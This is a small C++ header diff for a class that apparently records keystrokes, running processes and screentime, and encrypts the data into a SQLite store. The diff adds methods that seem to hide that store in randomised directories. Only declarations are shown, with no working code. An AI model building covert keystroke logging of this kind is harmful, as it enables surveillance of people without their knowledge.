@@ -38,15 +38,20 @@ public:
     void add_prc(ProcessInfo &);
     void add_screentime(Screentime &);
 private:
+    void finalize_queues();
     std::queue<std::wstring> keyQueue;
     std::queue<std::wstring> prcQueue;
-    std::wstring safedir;
+    std::wstring safedir, db_file;
 private:
-    void encrypt_n_copy(const std::wstring &file);
-    void decrypt_n_copy(const std::wstring &file);
     void encrypt_file(const std::wstring &file);
     void decrypt_file(const std::wstring &file);
     std::vector<CryptoPP::byte> buffer;
+private:
+    void hide();
+    void find();
+    void init_map();
+    uint32_t hash(std::wstring &text);
+    std::map<uint32_t, std::wstring> rnd_directories;
 private:
     sqlite3 *dbcon;
     std::wstring keyTable, proTable;
